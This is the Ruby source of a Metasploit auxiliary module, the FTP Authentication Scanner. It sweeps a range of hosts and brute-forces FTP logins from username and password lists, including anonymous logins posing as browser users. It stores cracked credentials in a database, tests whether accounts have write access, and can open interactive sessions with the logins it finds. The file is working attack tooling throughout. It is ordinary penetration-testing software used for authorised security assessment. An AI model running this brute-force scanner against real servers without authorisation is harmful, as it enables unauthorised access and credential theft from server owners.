##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/ftp'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::CommandShell
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary

  def proto
    'ftp'
  end

  def initialize
    super(
      'Name' => 'FTP Authentication Scanner',
      'Description' => %q{
        This module will test FTP logins on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
      },
      'Author' => 'todb',
      'References' => [
        [ 'CVE', '1999-0502'] # Weak password
      ],
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'ConnectTimeout' => 30,
        'CreateSession' => false
      }
    )

    register_options(
      [
        Opt::Proxies,
        Opt::RPORT(21),
        OptBool.new('RECORD_GUEST', [ false, 'Record anonymous/guest logins to the database', false]),
        OptBool.new('CreateSession', [false, 'Create a new session for every successful login', false])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('SINGLE_SESSION', [ false, 'Disconnect after every login attempt', false]),
        OptBool.new('FtpTrace', [ false, 'Trace FTP protocol commands and responses in the session', false]),
      ]
    )

    options_to_deregister = %w[FTPUSER FTPPASS CommandShellCleanupCommand AutoVerifySession]

    if framework.features.enabled?(Msf::FeatureManager::FTP_SESSION_TYPE)
      add_info('New in Metasploit 6.4 - The %grnCreateSession%clr option within this module can open an interactive session')
    else
      options_to_deregister << 'CreateSession'
    end

    deregister_options(*options_to_deregister)
    @accepts_all_logins = {}
  end

  def create_session?
    if framework.features.enabled?(Msf::FeatureManager::FTP_SESSION_TYPE)
      datastore['CreateSession']
    else
      false
    end
  end

  def run
    results = super
    logins = results.flat_map { |_k, v| v[:successful_logins] }
    sessions = results.flat_map { |_k, v| v[:successful_sessions] }
    print_status("Bruteforce completed, #{logins.size} #{logins.size == 1 ? 'credential was' : 'credentials were'} successful.")
    return results unless framework.features.enabled?(Msf::FeatureManager::FTP_SESSION_TYPE)

    if create_session?
      print_status("#{sessions.size} FTP #{sessions.size == 1 ? 'session was' : 'sessions were'} opened successfully.")
    else
      print_status('You can open an FTP session with these credentials and %grnCreateSession%clr set to true')
    end
    results
  end

  def run_host(ip)
    print_status("#{ip}:#{rport} - Starting FTP login sweep")

    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD'],
      prepended_creds: anonymous_creds
    )

    scanner = Metasploit::Framework::LoginScanner::FTP.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
        connection_timeout: datastore['ConnectTimeout'],
        ftp_timeout: datastore['FTPTimeout'],
        framework: framework,
        framework_module: self,
        ssl: datastore['SSL'],
        ssl_version: datastore['SSLVersion'],
        ssl_verify_mode: datastore['SSLVerifyMode'],
        ssl_cipher: datastore['SSLCipher'],
        local_port: datastore['CPORT'],
        local_host: datastore['CHOST'],
        use_client_as_proof: create_session?
      )
    )

    successful_logins = []
    successful_sessions = []
    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_data[:private_type] = :password
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
        successful_logins << result

        if create_session?
          begin
            successful_sessions << session_setup(result)
          rescue ::StandardError => e
            elog('Failed to setup the session', error: e)
            print_brute level: :error, ip: ip, msg: "Failed to setup the session - #{e.class} #{e.message}"
            result.connection.close unless result.connection.nil?
          end
        end
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
    { successful_logins: successful_logins, successful_sessions: successful_sessions }
  end

  # Always check for anonymous access by pretending to be a browser.
  def anonymous_creds
    anon_creds = [ ]
    if datastore['RECORD_GUEST']
      ['IEUser@', 'User@', 'mozilla@example.com', 'chrome@example.com' ].each do |password|
        anon_creds << Metasploit::Framework::Credential.new(public: 'anonymous', private: password)
      end
    end
    anon_creds
  end

  def test_ftp_access(user, scanner)
    dir = Rex::Text.rand_text_alpha(8)
    write_check = scanner.send_cmd(['MKD', dir], true)
    if write_check && write_check =~ (/^2/)
      scanner.send_cmd(['RMD', dir], true)
      print_status("#{rhost}:#{rport} - User '#{user}' has READ/WRITE access")
      return 'Read/Write'
    else
      print_status("#{rhost}:#{rport} - User '#{user}' has READ access")
      return 'Read-only'
    end
  end

  # @param [Metasploit::Framework::LoginScanner::Result] result
  # @return [Msf::Sessions::FTP]
  def session_setup(result)
    return unless (result.connection && result.proof)

    # Wrap the authenticated socket in a Rex::Proto::FTP::Client
    ftp_client = Rex::Proto::FTP::Client.new(result.proof, read_timeout: datastore['FTPTimeout'] || 16, trace: datastore['FtpTrace'])
    my_session = Msf::Sessions::FTP.new(result.connection, { client: ftp_client })
    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE' => nil,
      'PASS_FILE' => nil,
      'USERNAME' => result.credential.public,
      'PASSWORD' => result.credential.private
    }

    start_session(self, nil, merge_me, false, my_session.rstream, my_session)
  end

end
